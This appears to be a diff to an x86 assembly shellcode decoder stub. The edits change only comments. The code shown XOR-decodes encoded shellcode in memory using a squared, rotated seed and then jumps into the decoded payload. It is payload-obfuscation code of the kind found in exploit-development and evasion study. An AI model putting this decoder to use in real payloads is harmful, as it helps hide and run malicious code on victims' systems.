@@ -19,13 +19,13 @@ setup:
     mov cl, 0x07            ; move the length of the shellcode in bytes rounded up to the nearest byte into cl
 
 decode_loop:
-    mul eax                 ; multiply the seed with itself
+    mul eax                 ; square the seed
     mov ax, dx              ; We want the middle bytes between EAX and EDX combined. To get this simply we move the low bytes we want from EDX into the low bytes we will discard from EAX.
-    ror eax, 0x10           ; then we rotate EAX 16 bits to get the bits into petition. The output of this is the next round's seed.
+    ror eax, 0x10           ; then we rotate EAX 16 bits to get the bits into position. The output of this is not only what to decode our encoded shellcode but also the next round's seed.
     mov ebx, eax            ; copy the result into ebx to operate on, we need to hold onto the value returned by MUL in eax as it is the new seed for the next round of stretching.
     bswap ebx               ; when we dereference edi to get encoded bytes, they'll come back in little-endian format, to cut down on size we switch the endianness of ebx
     xor ebx, dword [edi]    ; decode four bytes of encoded shellcode
-    mov [edi], ebx          ; write the encoded shellcode back to
+    mov [edi], ebx          ; write the encoded shellcode back to memory
     add edi, 0x04           ; increment edi so it points to the next four bytes of encoded shellcode
     loop decode_loop        ; if we haven't iterated over the entire shellcode, move to the next round of decoding.
     jmp esi                 ; otherwise JMP to what should be decoded shellcode.
